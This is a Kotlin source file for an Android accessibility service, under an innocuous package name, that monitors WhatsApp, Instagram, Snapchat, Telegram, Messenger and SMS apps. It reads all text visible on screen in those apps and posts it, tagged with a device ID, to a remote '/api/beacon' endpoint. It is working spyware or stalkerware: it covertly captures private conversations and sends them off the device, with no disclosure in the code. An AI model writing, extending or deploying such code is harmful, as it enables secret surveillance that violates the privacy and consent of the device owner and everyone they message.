package com.sys.svc

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.*
import org.json.JSONObject

class AccService : AccessibilityService() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var lastPkg = ""
    private var lastText = ""
    private var lastEmit = 0L

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        val pkg = event.packageName?.toString() ?: return
        
        val tracked = mapOf(
            "com.whatsapp" to "WhatsApp",
            "com.whatsapp.w4b" to "WA Business",
            "com.instagram.android" to "Instagram",
            "com.snapchat.android" to "Snapchat",
            "org.telegram.messenger" to "Telegram",
            "com.facebook.orca" to "Messenger",
            "com.google.android.apps.messaging" to "SMS"
        )
        
        if (pkg !in tracked.keys) return

        val root = rootInActiveWindow ?: return
        val sb = StringBuilder()
        walk(root, sb)
        val text = sb.toString().trim()
        
        if (text.isBlank()) return
        if (text == lastText && pkg == lastPkg) return
        
        val now = System.currentTimeMillis()
        if (now - lastEmit < 1500) return
        lastText = text; lastPkg = pkg; lastEmit = now

        val body = JSONObject()
            .put("device_id", Prefs.deviceId(this))
            .put("kind", "screen")
            .put("payload", tracked[pkg] + " [" + pkg + "] :: " + text.take(3000))
        scope.launch { Net.postJson("/api/beacon", body) }
    }

    private fun walk(n: AccessibilityNodeInfo?, sb: StringBuilder) {
        n ?: return
        n.text?.let { if (it.isNotBlank()) sb.append(it).append(" ") }
        n.contentDescription?.let { if (it.isNotBlank()) sb.append(it).append(" ") }
        for (i in 0 until n.childCount) walk(n.getChild(i), sb)
    }

    override fun onInterrupt() {}
    
    override fun onServiceConnected() {
        serviceInfo = serviceInfo.apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100
            flags = flags or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }
    }
}